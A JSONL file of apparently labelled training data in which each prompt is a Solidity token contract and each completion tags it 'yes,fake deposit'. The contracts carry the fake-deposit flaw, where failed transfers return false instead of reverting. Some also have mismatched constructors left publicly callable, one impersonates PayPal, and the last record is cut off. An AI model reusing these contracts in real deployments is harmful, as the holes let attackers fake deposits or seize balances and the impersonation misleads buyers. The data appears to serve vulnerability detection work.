{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract AnalCoin is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = '1.1.3';\n\n function AnalCoin(\n ) {\n balances[msg.sender] = 500000000000000000000000000;\n totalSupply = 500000000000000000000000000;\n name = \"CoinDev.io\";\n decimals = 18;\n symbol = \"ANAL\";\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n/// @return total amount of tokens\nfunction totalSupply() constant returns (uint256 supply) {}\n\n/// @param _owner The address from which the balance will be retrieved\n/// @return The balance\nfunction balanceOf(address _owner) constant returns (uint256 balance) {}\n\n/// @notice send `_value` token to `_to` from `msg.sender`\n/// @param _to The address of the recipient\n/// @param _value The amount of token to be transferred\n/// @return Whether the transfer was successful or not\nfunction transfer(address _to, uint256 _value) returns (bool success) {}\n\n/// @notice send `_value` token to `_to` from `_from` on the condition it is approvedby `_from`\n/// @param _from The address of the sender\n/// @param _to The address of the recipient\n/// @param _value The amount of token to be transferred\n/// @return Whether the transfer was successful or not\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n/// @param _spender The address of the account able to transfer the tokens\n\n/// @param _value The amount of wei to be approved for transfer\n/// @return Whether the approval was successful or not\nfunction approve(address _spender, uint256 _value) returns (bool success) {}\n\n/// @param _owner The address of the account owning tokens\n/// @param _spender The address of the account able to transfer the tokens\n/// @return Amount of remaining tokens allowed to spent\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\nevent Transfer(address indexed _from, address indexed _to, uint256 _value);\nevent Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract StandardToken is Token {\n\nfunction transfer(address _to, uint256 _value) returns (bool success) {\n//Default assumes totalSupply can&#39;t be over max (2^256 - 1).\n//If your token leaves out totalSupply and can issue more tokens as time goes on,\n//you need to check if it doesn&#39;t wrap.\n//Replace the if with this one instead.\n//if (balances[msg.sender] &gt;= _value &amp;&amp; balances[_to] + _value &gt; balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n}\n\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n//same as above. Replace this line with the following if you want to protect againstwrapping uints.\n//if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n}\n\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n}\n\nfunction approve(address _spender, uint256 _value) returns (bool success) {\n\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n}\n\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n}\n\nmapping (address => uint256) balances;\nmapping (address => mapping (address => uint256)) allowed;\nuint256 public totalSupply;\n\n \n}\n\n//name this contract whatever you&#39;d like\ncontract AghettoCoin is StandardToken {\n\nfunction () { //if ether is sent to this address, send it back.\nthrow;\n}\n\n\n\n\nstring public name; //fancy name: eg Simon Bucks\nuint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It&#39;s like comparing 1 wei to 1 ether.\nstring public symbol; //An identifier: eg SBX\nstring public version = '1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you&#39;re token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\nfunction ERC20Token() {\n balances[msg.sender] = 100000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 100000000000000; // Update total supply (100000 forexample)\n name = \"AghettoCoin\"; // Set the name for display purposes\n\n decimals = 5; // Amount of decimals for display purposes\n symbol = \"AGTC\"; // Set the symbol for display purposes\n}\n\n\nfunction approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. Thiscrafts the function signature manually so one doesn&#39;t have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes_extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n\n if(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n \n \n}\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 20000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 100000; // Update total supply (100000 for example)\n name = \"Miko Coin\"; // Set the name for display purposes\n decimals = 0; // Amount of decimals for display purposes\n symbol = \"MIKOCOIN\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\npragma solidity 0.4.19;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n}\n\ncontract RegularToken is Token {\n\n function transfer(address _to, uint _value) returns (bool) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint _value) returns (bool) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint _value) returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n uint public totalSupply;\n}\n\ncontract UnboundedRegularToken is RegularToken {\n\n uint constant MAX_UINT = 2**256 - 1;\n\n /// @dev ERC20 transferFrom, modified such that an allowance of MAX_UINT represents an unlimited amount.\n /// @param _from Address to transfer from.\n /// @param _to Address to transfer to.\n /// @param _value Amount to transfer.\n /// @return Success of transfer.\n function transferFrom(address _from, address _to, uint _value)\n public\n returns (bool)\n {\n uint allowance = allowed[_from][msg.sender];\n if (balances[_from] >= _value\n && allowance >= _value\n && balances[_to] + _value >= balances[_to]\n ) {\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n}\n\ncontract STToken is UnboundedRegularToken {\n\n uint public totalSupply = 33*10**25;\n uint8 constant public decimals = 18;\n string constant public name = \"StarToken\";\n string constant public symbol = \"ST\";\n\n function STSToken() {\n balances[msg.sender] = totalSupply;\n Transfer(address(0), msg.sender, totalSupply);\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract ShibaHotDog is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Shiba Hot Dog\";\n string public constant symbol = \"INU \ud83c\udf2d\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// PayPal Official Token\n// https://paypal.com\n// https://twitter.com/PayPal\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract PayPal is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"PayPal\";\n string public constant symbol = \"PAYPAL\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: Unlicense\n\n// ----------------------------------------------------------------------------\n// 'GrilledCheeseToken' token contract\n//\n// Symbol : GCT \ud83e\udd6a\n// Name : Grilled Cheese Token\n// Total supply: 100,000,000,000,000\n// Decimals : 18\n// Burned : 50%\n// ----------------------------------------------------------------------------\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract GrilledCheeseToken is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 100000000000000*10**uint256(decimals);\n string public constant name = \"Grilled Cheese Token\";\n string public constant symbol = \"GCT \ud83e\udd6a\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: GPL-3.0\n\npragma solidity ^0.8.0;\n\nabstract contract Token {\n\n /// @return supply - total amount of tokens\n function totalSupply() external virtual returns (uint256 supply);\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return balance - The balance\n function balanceOf(address _owner) virtual public returns (uint256 balance);\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return success - Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) virtual public returns (bool success);\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return success - Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) virtual public returns (bool success);\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return success - Whether the approval was successful or not\n function approve(address _spender, uint256 _value) virtual public returns (bool success);\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return remaining - Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) virtual public returns (uint256 remaining);\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\nabstract contract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) override public returns (bool success) {\n require(paused == false, \"Contract Paused\");\n \n // Assumes totalSupply can't be over max (2^256 - 1).\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) override public returns (bool success) {\n require(paused == false, \"Contract Paused\");\n \n // Assumes totalSupply can't be over max (2^256 - 1).\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) override public view returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) override public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) override public view returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n function setPaused(bool _paused) public {\n require(msg.sender == owner, \"You are not the owner\");\n paused = _paused;\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public override totalSupply;\n bool public paused;\n address public owner;\n}\n\n\ncontract SMILECoin is StandardToken {\n \n \n mapping (address => uint256) public amount;\n string public name;\n string public symbol;\n uint256 public decimals;\n string public version;\n\n // if ETH is sent to this address, send it back.\n fallback() external payable { revert(); }\n receive() external payable { revert(); }\n \n constructor () {\n // Tokennomics\n name = \"Smile Coin\";\n decimals = 10;\n symbol = \"SMILE\";\n version = \"1.0\";\n \n owner = msg.sender;\n setPaused(false);\n \n // Mint 10,000,000,000 Tokens and assign them to the Smile Reserve Wallet\n totalSupply = 10000000000 * (10 ** uint256(decimals));\n balances[msg.sender] = totalSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.25;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n \n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n \n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract MoonDoge is StandardToken { \n\n \n\n \n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'MOGE1.0'; \n uint256 public unitsOneEthCanBuy; \n uint256 public totalEthInWei; \n address public fundsWallet; \n\n \n function MoonDoge() {\n balances[msg.sender] = 10000000000000000000000000000; \n totalSupply = 10000000000000000000000000000;\n name = \"Moon Doge\";\n decimals = 18; \n symbol = \"MOGE\"; \n unitsOneEthCanBuy = 0; //7% bonus= OneEth// \n fundsWallet = msg.sender; \n }\n\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n\n Transfer(fundsWallet, msg.sender, amount); \n\n fundsWallet.transfer(msg.value); \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Inu_Finance is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Inu Finance\";\n string public constant symbol = \"INUFI\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns 